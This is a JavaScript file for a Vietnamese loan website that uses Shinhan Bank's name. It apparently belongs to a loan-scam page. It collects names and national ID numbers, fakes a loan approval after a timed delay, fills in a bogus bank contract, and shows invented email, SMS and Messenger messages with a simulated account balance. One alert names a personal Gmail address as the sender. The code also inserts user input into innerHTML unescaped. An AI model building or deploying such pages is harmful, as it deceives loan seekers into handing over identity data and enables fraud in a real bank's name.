document.addEventListener('DOMContentLoaded', () => {
    // Hamburger Menu
    const hamburger = document.querySelector('.hamburger');
    const nav = document.querySelector('header nav');
    hamburger.addEventListener('click', () => {
        nav.classList.toggle('active');
        hamburger.classList.toggle('active');
    });

    // Toggle Sections
    const toggles = document.querySelectorAll('.section-toggle');
    toggles.forEach(toggle => {
        toggle.addEventListener('click', () => {
            const content = toggle.nextElementSibling;
            const isActive = content.classList.contains('active');
            document.querySelectorAll('.section-content').forEach(c => c.classList.remove('active'));
            document.querySelectorAll('.section-toggle').forEach(t => t.classList.remove('active'));
            if (!isActive) {
                content.classList.add('active');
                toggle.classList.add('active');
            }
        });
    });

    // Toggle Categories
    const categoryCards = document.querySelectorAll('.category-card');
    categoryCards.forEach(card => {
        card.addEventListener('click', (e) => {
            if (!e.target.closest('.sub-items')) {
                card.classList.toggle('active');
            }
        });
    });

    // Loan Details Toggle
    const detailButtons = document.querySelectorAll('.loan-card button');
    detailButtons.forEach(button => {
        button.addEventListener('click', () => {
            const details = button.parentElement.querySelector('.details');
            details.classList.toggle('active');
            button.textContent = details.classList.contains('active') ? 'Ẩn chi tiết' : 'Tìm hiểu';
        });
    });

    // Loan Calculator
    const calcButton = document.querySelector('#loan-calculator .section-content button');
    calcButton.addEventListener('click', () => {
        const amount = parseFloat(document.querySelector('#loan-calculator input[type="number"][placeholder="Số tiền vay (VNĐ)"]').value);
        const term = parseInt(document.querySelector('#loan-calculator input[type="number"][placeholder="Thời hạn vay (tháng)"]').value);
        const loanType = document.querySelector('#loan-calculator select').value;
        let rate;

        // Kiểm tra dữ liệu đầu vào
        if (isNaN(amount) || amount <= 0) {
            alert('Vui lòng nhập số tiền vay hợp lệ!');
            return;
        }
        if (isNaN(term) || term <= 0) {
            alert('Vui lòng nhập thời hạn vay hợp lệ!');
            return;
        }
        if (!loanType || loanType === "Loại vay") {
            alert('Vui lòng chọn loại vay!');
            return;
        }

        // Gán lãi suất theo loại vay
        if (loanType === "Vay mua xe") rate = 6.5;
        else if (loanType === "Vay mua nhà") rate = 7.0;
        else if (loanType === "Vay tín chấp") rate = 8.0;
        else if (loanType === "Vay sửa nhà") rate = 7.5;

        const monthlyRate = rate / 100 / 12;
        const monthlyPayment = (amount * monthlyRate * Math.pow(1 + monthlyRate, term)) / (Math.pow(1 + monthlyRate, term) - 1);
        const totalPayment = monthlyPayment * term;

        const resultDiv = document.querySelector('#loan-calculator .result');
        if (isNaN(monthlyPayment) || isNaN(totalPayment)) {
            resultDiv.innerHTML = 'Không thể tính toán. Vui lòng kiểm tra lại thông tin nhập!';
        } else {
            resultDiv.innerHTML = `Thanh toán hàng tháng: ${monthlyPayment.toFixed(0)} VNĐ<br>Tổng tiền: ${totalPayment.toFixed(0)} VNĐ`;
        }
    });

    // Registration Form Validation and Submission
    const registerButton = document.querySelector('#register-form .section-content button');
    registerButton.addEventListener('click', (e) => {
        e.preventDefault();
        const email = document.querySelector('#register-form input[type="email"]').value;
        const loanAmount = parseFloat(document.querySelector('#register-form input[placeholder="Số tiền vay (VNĐ)"]').value);

        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(email)) {
            alert('Vui lòng nhập email hợp lệ!');
            return;
        }

        if (isNaN(loanAmount) || loanAmount <= 0) {
            alert('Số tiền vay phải lớn hơn 0!');
            return;
        }

        document.querySelector('#confirm-modal').style.display = 'flex';
    });

    // Confirm Form with Loading and Contract Generation
    const confirmButton = document.querySelector('#confirm-modal button');
    confirmButton.addEventListener('click', () => {
        const loader = document.querySelector('#confirm-modal .loader');
        loader.style.display = 'block';
        confirmButton.disabled = true;

        setTimeout(() => {
            loader.style.display = 'none';
            confirmButton.disabled = false;
            document.querySelector('#confirm-modal').style.display = 'none';
            document.querySelector('.contract-display').classList.add('active');

            // Auto-fill contract
            const customerName = document.querySelector('#register-form input[placeholder="Họ và tên"]').value;
            const customerId = document.querySelector('#register-form input[placeholder="CCCD/CMND"]').value;
            const loanAmount = document.querySelector('#register-form input[placeholder="Số tiền vay (VNĐ)"]').value;
            const loanTerm = document.querySelector('#register-form input[placeholder="Thời hạn vay (tháng)"]').value;
            const loanType = document.querySelector('#register-form select').value;

            const contractContent = document.querySelector('#contract-content');
            contractContent.innerHTML = `
                <h3>HỢP ĐỒNG VAY TÍN CHẤP SHINHAN BANK</h3>
                <p><strong>Số hợp đồng:</strong> SHB-${Date.now()}</p>
                <p><strong>Ngày ký:</strong> ${new Date().toLocaleDateString('vi-VN')}</p>
                <p><strong>Bên vay:</strong> ${customerName}</p>
                <p><strong>CCCD/CMND:</strong> ${customerId}</p>
                <p><strong>Số tiền vay:</strong> ${loanAmount} VNĐ</p>
                <p><strong>Thời hạn vay:</strong> ${loanTerm} tháng</p>
                <p><strong>Loại vay:</strong> ${loanType}</p>
                <p><strong>Lãi suất:</strong> 8%/năm (tính trên dư nợ giảm dần)</p>
                <p><strong>Điều khoản:</strong> Bên vay cam kết thanh toán đúng hạn theo lịch trả nợ. Phí tất toán trước hạn: 3% dư nợ gốc nếu trong 3 năm đầu, 0% từ năm thứ 4 trở đi.</p>
                <p><strong>Đại diện Shinhan Bank:</strong> [Chữ ký và con dấu]</p>
            `;

            // Notifications
            alert('Email gửi đến ThuyTrangEly318@gmail.com: "Đăng ký vay thành công. Vui lòng kiểm tra hợp đồng trong hệ thống."');
            alert('SMS: "Shinhan Bank: Đăng ký vay thành công. Kiểm tra hợp đồng tại website."');

            // Messenger Notification
            const balance = loanAmount; // Giả lập số dư = số tiền vay
            alert(`Messenger: "Shinhan Bank: Hồ sơ vay của bạn đã được duyệt. Số dư tài khoản: ${balance} VNĐ. Liên hệ hỗ trợ: https://m.me/shinhanbankvietnam"`);
            window.open('https://m.me/shinhanbankvietnam', '_blank');
        }, 2000);
    });

    // No Card Guide
    const noCardLink = document.querySelector('.no-card');
    noCardLink.addEventListener('click', () => {
        alert('Để xem số thẻ, đăng nhập ứng dụng ngân hàng hoặc liên hệ chi nhánh. Nếu chưa có thẻ, vui lòng đến Shinhan Bank để phát hành.');
    });

    // Support Buttons
    const callButton = document.querySelector('.support-btn.call');
    callButton.addEventListener('click', () => {
        window.location.href = 'tel:19001577';
    });

    const chatButton = document.querySelector('.support-btn.chat');
    chatButton.addEventListener('click', () => {
        alert('Chức năng chat đang được phát triển. Vui lòng gọi hotline 1900 1577 để được hỗ trợ!');
    });

    const messengerButton = document.querySelector('.support-btn.messenger');
    messengerButton.addEventListener('click', () => {
        window.open('https://m.me/shinhanbankvietnam', '_blank');
    });
});